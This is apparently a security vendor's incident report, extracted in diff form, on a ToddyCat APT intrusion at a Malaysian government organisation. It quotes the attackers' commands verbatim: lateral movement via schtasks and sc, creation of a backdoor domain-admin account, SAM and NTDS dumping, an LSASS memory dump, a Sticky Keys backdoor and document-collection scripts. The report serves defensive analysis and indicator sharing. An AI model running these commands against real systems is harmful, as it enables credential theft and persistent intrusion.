@@ -1,0 +1,204 @@
+Incident 4. Malaysia
+Victim summary
+Contents 51
+Threat
+ToddyCat
+Industry
+Government
+Incident description
+Countries affected
+Malaysia
+In February of 2023, our SOC team was alerted about a potential security breach observed in the telemetry of
+one of our customers. Further investigation revealed that the well-known APT group known as ToddyCat was
+probably responsible for the attack. Details of the incident, including the event history, and the TTPs used by
+the group are described below.
+Detailed description
+During SOC monitoring, our analysts detected malicious activity pointing to ToddyCat. When investigating
+the alert, we focused on a suspicious DLL that was run as a Windows service (Create or Modify System
+Process: Windows Service T1543.003). The ToddyCat alert was triggered by their typical pattern of
+implementing the LZSS algorithm in the memory of a process that was detected by Kaspersky Endpoint
+Security (KES):
+CommandLine: С:\Windows\system32\svchost.exe -k fontcsvc
+The DLL file of the Windows service was found in the following registry key:
+Registry key: HKLM\System\ControlSet001\Services\FontCacheSvc\Parameters\ServiceDll
+Registry value: C:\Program Files\Common Files\System\apibridge.dll
+MD5: BB08CAE5C2C741BC040C9EC6E046BCAC
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 4. Malaysia
+We also detected a suspicious library, but unfortunately, we were not able to obtain the file:
+DLL: С:\Windows\system32\up.dll
+MD5: 5448F7DB84E87FEDD362F4A79C9BC302
+Registry hive: HKLM\SYSTEM\ControlSet001\Services\ctt
+Commandline: cmd /c start /b rundll32.exe С:\Windows\system32\up.dll,Start
+Contents 52
+The FontCacheSvc service was started by the services.exe process while an RPC connection from a remote
+host was established at the same time. This indicates that the service was created from the remote host using
+the sc create command. Unfortunately, the remote host was not connected to our monitoring system and we
+were unable to get event log files from it.
+Application Layer Protocol: Web Protocols T1071.001
+The service process mentioned above connected to 154.202.56[.]211:443 and made a POST request:
+hxxps://154.202.56[.]211/collector/3.0/. This URL matches the URL path structure used by ToddyCat.
+Ingress Tool Transfer T1105
+Several scripts and executable files were downloaded from this C2 server to the target host.
+c:\intel\mvl.ps1
+c:\intel\1.ps1
+c:\intel\7z64.exe
+c:\intel\db_org.exe (MD5: BEBBEBA37667453003D2372103C45BBF)
+Interestingly, PowerShell scripts were downloaded several times but with different MD5 hashes. The
+downloaded scripts were accompanied by the tools necessary for them to work, such as the file archiving tool
+WinRAR that was renamed to 7z64.exe.
+In addition, the service started a command shell in which we observed the following reconnaissance
+commands and lateral movement through the network:
+tasklist /v
+arp -a
+net use
+ping  -n 
+net user  /dom
+net group “domain admins” /dom
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 4. Malaysia Contents 53
+Remote Services: SMB/Windows Admin Shares T1021.002
+After conducting their reconnaissance, the operator used the net use command to attempt to connect to
+remote hosts with a compromised user account:
+net use \\c$  /user:\
+When successfully connected, the operator created a scheduled task on the remote machine.
+Scheduled Task/Job: Scheduled Task T1053.005
+On each remote host that the attacker was able to connect to, a one-time scheduled job aptly named "one"
+was created to run the PowerShell script that was previously downloaded from the C2 server:
+schtasks /s  /tn one /u \ /p  /create /ru system /sc
+DAILY /tr "cmd /c start /b PowerShell.exe -exec bypass -c 'C:\programdata\intel\mvl.ps1 20'" /f
+schtasks /s  /tn one /u \ /p  /i /run
+System Services: Service Execution T1569.002
+On one of the remote hosts, the attacker failed to create a scheduled task and then attempted to create a
+service:
+sc \ create ctt binpath= "cmd /c start /b PowerShell.exe -exec bypass -c
+'C:\programdata\intel\mvl.ps1 30'"
+sc \ start ctt
+sc \ delete ctt
+We also observed the use of AtExec and PsExec to move malicious files and run them on remote hosts.
+Automated Collection T1119
+The PowerShell script that was run in the scheduled task searches for documents in user folders and saves the
+found files in a new folder with the hostname in a temporary directory.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 4. Malaysia
+Contents 55
+The argument sent to the program is a file name in the form of an encoded string. This executable file is
+intended for sending data to the Dropbox cloud service.
+We saw above that persistence was facilitated by creating a new FontCacheSvc service using svchost.exe.
+During our investigation, we also encountered other techniques.
+Hijack Execution Flow: DLL Side-Loading T1574.002
+The following files were moved from the operator's machine to another one:
+
+
+vlc.exe, a popular legitimate application known as VLC Media Player, which is vulnerable to DLL Hijacking
+
+
+libvlc.dll, a malicious library (MD5: CBE5AEB8D809C4E09C7C2B7705C35F95);
+
+
+playlist.dat, a RAT config.
+
+
+To run the RAT via DLL Sideloading, the attackers created a service remotely using sc.exe:
+sc \ create VLCMediaSvc binpath= “"C:\Program Files\Common Files\VLCMedia\vlc.exe"
+service”
+After starting the service, the vlc.exe process loads a malicious library that it turn decrypts the RAT
+configuration file, starts the legitimate process c:\windows\system32\wusa.exe in the suspended state, then
+injects the RAT into the process (Process Hollowing T1055.012).
+Figure 24 Attack scenario
+|Col1|Cmd.exe|
+|---|---|
+|Wusa.exe||
+|Col1|Creating process insuspended mode &inject beaconLibvlc.dll|
+|---|---|
+|Loadingmalicious DLLVLC.exe||
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 4. Malaysia Contents 56
+We already examined how the ToddyCat implant works earlier in this document. In this case, the request to
+the C2 server is sent to hxxps://45.124.115[.]83/collector/3.0/ and the necessary files are downloaded from it.
+These downloaded files include a PowerShell script for gathering user documents and running a command
+shell that is used by the operator for reconnaissance and lateral movement through the network.
+Figure 25 Command center location
+Persistence: Account Creation
+In addition to creating various services and tasks in the Task Scheduler, the APT group known as ToddyCat
+used an additional tool that created an administrative account (Create Account: Domain Account
+T1136.002).
+A scheduled job was created to run this tool. The commands, username, and password are hardcoded in this
+tool.
+New Task: GoogleUpdate: MD5: 0x80499E88A7054F83674463F029D58657
+Svchost.exe (svchost.exe -k netsvcs -p -s Schedule)
+Cmd.exe
+net user norshasa /del /do
+net user norshasa P@ssw0rd123... /add /do
+net user norshasa /active:yes
+net group "Domain Admins" norshasa /add /do
+net localgroup "Remote Desktop Users" norshasa /add /do
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 4. Malaysia Contents 57
+Lateral Movement: PsExec и Atexec
+Earlier, we saw the SMB protocol being used when creating a Windows service or task on a remote host. We
+also saw the use of PsExec and AtExec.
+Using a RAT, the operator downloaded the PsExec tool: Ps2.exe
+Parent_image_path: “С:\Windows\system32\cmd.exe”
+Command_line: “Ps2.exe -accepteula -h \ -u  -p  cmd”
+As expected, we observe the psexesvc service being created on the remote computer:
+Parent_image_path: “С:\Windows\psexesvc.exe”
+Image_path: “С:\Windows\system32\cmd.exe”
+Here are some more examples of commands that were executed on the remote host using PsExec:
+quser
+reg save hklm\sam sa
+reg save hklm\system sys
+reg save hklm\security sec
+rundll32.exe С:\Windows\System32\comsvcs.dll, MiniDump 880 lsass.dmp full
+rundll32.exe С:\Windows\System32\111.dll, MiniDump 880 lsass.dmp full
+ntdsutil.exe “ac i ntds” “ifm” “create full c:\programdata\temp” q q
+C:\ProgramData\rc.exe (Rubeus)
+klist
+reg add "HKLM\software\microsoft\windows nt\currentversion\image file execution options\sethc.
+exe”" /v Debugger /t reg_sz /d "\windows\system32\cmd.exe”
+The last command uses the technique known as Event Triggered Execution: Accessibility Features
+T1546.008, specifically through the Accessibility Featur called Sticky Keys (sethc.exe) to run the cmd.exe
+command shell from a lock screen.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 4. Malaysia Contents 58
+С:\Windows\system32\winlogon.exe
+С:\Windows\system32\cmd.exe sethc.exe 211
+reg save hklm\sam C:\ProgramData\sa
+KES blocked the PowerShell scripts that were used to gather user documents, so the attackers
+were forced to change their approach. For this reason, they wrote a batch script (MD5:
+114DECCBB815C520DD2291C946A3A7ED) in which they also used PowerShell to gather user files:
+PowerShell.exe "dir C:\Users -File -Recurse -Include '.pdf', '.doc', '.docx', '.xls', '*.xlsx' | where
+LastWriteTime -gt (Get-date).AddDays(-8) | copy-item -Destination C:\Users\public\tmp -Force
+-ErrorAction SilentlyContinue"
+This was also blocked, so the attackers decided to implement this functionality in .NET through fkw.exe (MD5:
+AFEA0827779025C92CAB86F685D6429A).
+The next interesting tool we found was a DLL Hijacker library that tracks the creation of new files and maintains
+records in an SQLite database:
+С:\Windows\temp\exe\dsncdiag.dll - (MD5 5607A0E2BB87D6BE828A5E2980116CFA,
+14FF83A500D403A5ED990ED86296CCC7)
+С:\Windows\temp\exe\acrord64.exe
+There is another DLL Hijacker tool for data exfiltration at the path C:\windows\temp\ck\vspmsg.dll (MD5
+318C16195F62094DADCC602B547BBE66):
+Command_line: “С:\Windows\temp\ck\securityhealthsystray64.exe -d С:\Windows\temp\ --rex .z”
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 4. Malaysia
+Summary
+Contents 59
+After carefully examining the actions of the attacker in this incident, we can assume that the group behind
+this attack was highly motivated, was entrenched in the infrastructure for a long time, and had a store of
+created user accounts that the attackers could use to get back into the network. They varied their persistence
+methods on different hosts, and modified the PowerShell scripts that they used to gather data. The samples
+used in the attack can be tentatively attributed to ToddyCat. An article about this APT group was previously
+published on the Securelist portal [7] . Its victims are primarily government agencies and military structures
+predominately located in Asia.
+Download techniques in JSON format for MITRE Navigator:
+Learn more
+Figure 25
+Threat Landscape page interface in TIP
+7
+APT ToddyCat
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 60
+Incidents involving Asian APT groups in various regions of the planet
